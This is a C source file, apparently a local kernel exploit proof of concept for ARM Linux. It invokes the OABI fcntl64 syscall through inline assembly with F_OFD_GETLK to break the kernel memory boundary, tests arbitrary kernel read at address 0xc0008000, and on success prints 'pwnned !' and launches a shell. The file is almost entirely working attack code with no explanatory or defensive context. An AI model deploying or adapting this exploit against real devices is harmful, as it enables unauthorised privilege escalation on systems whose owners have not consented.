#define _GNU_SOURCE

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/ptrace.h>

int try_to_read_kernel(){
  int pipefd[2];
  ssize_t len;
  ssize_t try_bytes = 4;
  
  pipe(pipefd);
  len = write(pipefd[1], (void*)0xc0008000, try_bytes);
  
  close(pipefd[0]);
  close(pipefd[1]);
  
  return len == try_bytes;
}

__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
	
	__asm __volatile (
	"swi	0x9000DD\n"
	"mov	pc, lr\n"
	:   
	:
	:
	);
}

#define F_OFD_GETLK	36
#define F_OFD_SETLK	37
#define F_OFD_SETLKW 38


int main(int argc, char const *argv[]){
	int fd = open("/proc/cpuinfo", O_RDONLY);
	struct flock *map_base = 0;

	if(fd == -1){
		perror("open");
		return -1;
	}
	map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(map_base == (void*)-1){
		perror("mmap");
		goto _done;
	}
	printf("map_base %p\n", map_base);
	memset(map_base, 0, 0x1000);
	map_base->l_start = SEEK_SET;
	if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
		perror("sys_oabi_fcntl64");
	}
	// Arbitrary kernel read/write test
	if(try_to_read_kernel()){
		printf("pwnned !\n");
	  system("/bin/sh");
  }
	munmap(map_base, 0x1000);
_done:
	close(fd);
	return 0;
}
